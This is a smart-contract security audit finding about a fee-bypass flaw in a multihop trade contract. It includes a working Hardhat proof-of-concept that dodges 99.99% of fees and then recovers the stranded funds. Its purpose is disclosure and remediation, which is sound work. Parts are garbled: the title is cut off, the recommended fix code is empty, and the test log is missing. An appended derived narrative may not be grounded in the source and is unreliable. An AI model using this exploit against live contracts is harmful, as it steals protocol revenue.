---
id: 22809
severity: "High"
---

# Fees can be bypassed by 99.99% by setting

## Description

In a multihop trade, traders can add a last hop with the ratioBps equal to 1, and fee token to the (fake) output token, which will allow dodging of fees by 99.99%. A large portion of output funds be in the contract, but they can be easily retrieved later.
In Maradona, for single-hop trades, the total ratioBps is validated to be 10000
dit-v1/contracts/Paymaster/Messi.sol#L588-L591
```solidity
if (ops.length == 1) {
    require(ops[0].useContractFunds == false, "Messi: single operation must not use contract funds");
    require(ops[0].ratioBPs == 10000, "Messi: single operation must have ratioBPs equal to 10000");
}
```
If there are multiple hops, each hop's split are also validated to sum up to 10000
dit-v1/contracts/Paymaster/Messi.sol#L605-L612
```solidity
if (i > 0 && op.inputToken != lastAddress) {
    require(cumRatio == 10000, "Messi: cumRatio is not 10000");
}
```
inject a fake trade at the end, with a BPS of 1, and the fee token to be the (fake) output token.
This will allow dodging 99.99% of the fees, and the real output amount to remain in the contract, which, has been outlined in the README, can easily be retrieved by performing a dust trade with that as the output.
• Fees can be bypassed
• Funds may remain in the contract, breaking protocol invariant

## Proof of Concept

Alice wants to trade 1 ETH to USDC. She can dodge the fees using the following sequence of two operations:
• Operation 1: ETH to USDC. Amount in = 1, ratioBPS = 10000,
• Operation 2: USDC = USDT. Amount in = irrelevant (because it will get overwritten), ratioBPS = 1
• Fee token = USDT
What will happen is that:
• The contract swaps 1 ETH into, say, 4000 USDC
• The contract takes 0.01% of the output USDC amount, that is, 0.4 USDC, and swaps it to 0.4 USDT
• The contract charges a small fee on this 0.4 USDT (just 0.004 USDT), and returns the rest to Alice
• The rest of the 3999.6 USDC remain in the contract, but can be retrieved by Alice at any time using the outlined trade above (even in the same tx as the attack)
We also provide a coded PoC:
```typescript
it.only("PUSH0 PoC - last hop BPS = 1", async function () {
    // Load fixture elements
    const {signers, maradona, mockMarkets, mockTokens} = await loadFixture(deployFixture);

    // User stuff
    const owner = signers[0];
    const users = signers.slice(1);
    const sponsor = users[0];
    const traders = users.slice(1);
    const trader = traders[0];
    const traderAddress = trader.address.toLowerCase();
    // update sponsor
    await maradona.connect(owner).updateCollector(sponsor.address)
    // Token stuff
    const middleToken = mockTokens[1];
    const middleTokenAddress = mockTokens[1].target.toString();
    const outputToken = mockTokens[2];
    const outputTokenAddress = outputToken.target.toString();
    // two operations:
    // Op1: ETH ---> output token, amount = 1, bps = 10000
    // Op2: output token --> middle token, amount = any, bps = 1
    // Fee token: Middle token
    const valueONE = ethers.parseEther("1");
    const feeBps = toBigInt(5);
    const feeValue = toBigInt(2) * valueONE * feeBps / toBigInt(10000)
    const opParams: OperationParametersStruct[] = [getEmptyOpParams(), getEmptyOpParams()];

    opParams[0].inputToken = ethers.ZeroAddress
    opParams[0].outputToken = outputTokenAddress
    opParams[0].ratioBPs = toBigInt(10000)
    opParams[0].amountIn = valueONE.toString()
    opParams[0].exchangeID = 1
    opParams[1].inputToken = outputTokenAddress
    opParams[1].outputToken = middleTokenAddress
    opParams[1].ratioBPs = toBigInt(1)
    opParams[1].useContractFunds = true;
    opParams[1].amountIn = 0
    opParams[1].exchangeID = 1
    // trade and test!
    expect(await ethers.provider.getBalance(maradona.target)).to.be.equal(toBigInt(0))

    expect(await outputToken.balanceOf(maradona.target)).to.be.equal(toBigInt(0))
    const tx = await maradona.connect(trader).takeTokensAndTrade(
        opParams,
        "0",
        owner.address,
        traderAddress,
        middleTokenAddress,
        {
            value: valueONE,
        }
    )
    const rx = await tx.wait();
    const txGas = rx ? rx.cumulativeGasUsed * rx.gasPrice : toBigInt(0);
    expect(await ethers.provider.getBalance(maradona.target)).to.be.equal(toBigInt(0))

    expect(await middleToken.balanceOf(maradona.target)).to.be.equal(toBigInt(0))
    expect(await outputToken.balanceOf(maradona.target)).to.be.greaterThan(toBigInt(0))

    console.log("Maradona's output token balance:", await outputToken.balanceOf(maradona.target))

    console.log("Traders's middle token balance:", await middleToken.balanceOf(traderAddress))

    // now retrieve the funds
    const opParams2: OperationParametersStruct[] = [getEmptyOpParams()];
    opParams2[0].inputToken = ethers.ZeroAddress
    opParams2[0].outputToken = outputTokenAddress
    opParams2[0].ratioBPs = toBigInt(10000)
    opParams2[0].amountIn = toBigInt(1) // dust ethers only
    opParams2[0].exchangeID = 1
    const tx2 = await maradona.connect(trader).takeTokensAndTrade(
        opParams2,
        "0",
        owner.address,
        traderAddress,
        ethers.ZeroAddress,
        {
            value: toBigInt(1),
        }
    )
    const rx2 = await tx2.wait();
    console.log("\nAfter retrieval")
    console.log("Maradona's output token balance after retrieval:", await outputToken.balanceOf(maradona.target))

    console.log("Traders's output token balance after retrieval:", await outputToken.balanceOf(traderAddress))

    console.log("Traders's middle token balance:", await middleToken.balanceOf(traderAddress))

    console.log("Trader's total balance:", (await middleToken.balanceOf(traderAddress)) + (await outputToken.balanceOf(traderAddress)))

});
```
Run the test with make tests/Maradona, the test log shows:
Which proves that indeed 99.99% of the real output token remains in the contract, and the remaining 0.01% is charged a fee and returned. It also shows that the trader's total balance is far greater than what would've been charged if the fee was 0.5% as per the test's setup, showing successful retrieval of funds.

## Recommendation

validation to Maradona, right after the loop in line 645:
```solidity
if (swapOps.length > 0) {
}
```
This validation must be done if there is at least one swap operation, otherwise direct bridge operation will revert.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a fee‑bypass flaw in the multihop trade logic of the Maradona paymaster contract. It allows an attacker to construct a trade consisting of multiple hops where the final hop is configured with a ratioBps value of 1 and the fee token set to the same token that is used as the fake output of that hop. Because the contract only validates that the cumulative ratio of each hop reaches 10000 before a new input token is processed, it does not enforce that the total ratio after the last hop also equals 10000 when the hop uses contract funds. Consequently the contract treats almost the entire output amount as contract‑owned funds, takes a fee on only the tiny 1 bps portion that is swapped to the fee token, and returns that small amount to the user. The remaining 99.99 % of the expected output stays in the contract but can be retrieved later by the attacker through a dust trade that uses the same token as output. The root cause is insufficient validation of the ratioBps sum and of operations that use contract funds in a multihop context. Exploitation proceeds by submitting a legitimate first hop (e.g., ETH→USDC with ratioBps = 10000) followed by a malicious second hop (USDC→USDT with ratioBps = 1 and useContractFunds = true). The contract swaps the ETH, takes a negligible fee on the 0.01 % of USDC that is converted to USDT, and leaves the bulk of the USDC locked in its balance. From the user’s perspective the expected output token is largely missing; the user receives only a tiny amount of the fee token and may notice that the contract’s balance of the output token has increased unexpectedly. The protocol’s fee revenue is severely reduced, breaking the economic invariant that fees are collected on the full trade amount. The issue was discovered during a security audit when the auditors added a PoC test that demonstrated the 99.99 % fee evasion and the subsequent retrieval of the locked funds. The bug is hard to notice because the contract still returns a non‑zero amount and the balance change can be attributed to normal trade activity. To remediate, the contract should enforce after processing all hops that the total ratioBps equals 10000 regardless of whether contract funds are used, and it should prohibit a hop that both uses contract funds and specifies a non‑zero ratioBps or sets the fee token as the output token of that hop. In other words, the validation logic must ensure that no operation can artificially shrink the fee base by diverting the majority of the output into contract‑owned balance.
